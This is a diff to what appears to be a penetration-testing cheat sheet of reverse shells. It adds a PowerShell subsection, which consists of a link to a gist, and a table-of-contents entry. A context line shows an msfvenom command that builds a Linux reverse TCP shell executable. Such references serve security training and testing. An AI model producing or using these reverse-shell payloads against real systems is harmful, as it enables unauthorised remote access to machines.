@@ -11,6 +11,7 @@
   - [Non-Meterpreter shells](#non-meterpreter-shells)
     - [Useful reverse shells](#useful-reverse-shells)
     - [Windows](#windows)
+      - [Powershell](#powershell)
       - [x86 staged - msfvenom (Non-Meterpreter)](#x86-staged---msfvenom-non-meterpreter)
       - [x64 staged - msfvenom (Non-Meterpreter)](#x64-staged---msfvenom-non-meterpreter)
       - [x86 stageless - msfvenom (Non-Meterpreter)](#x86-stageless---msfvenom-non-meterpreter)
@@ -70,6 +71,9 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=443 -f elf > shell.elf
 ```
 
 ### Windows
+
+#### Powershell
+https://gist.github.com/tothi/ab288fb523a4b32b51a53e542d40fe58
 
 #### x86 staged - msfvenom (Non-Meterpreter)
 
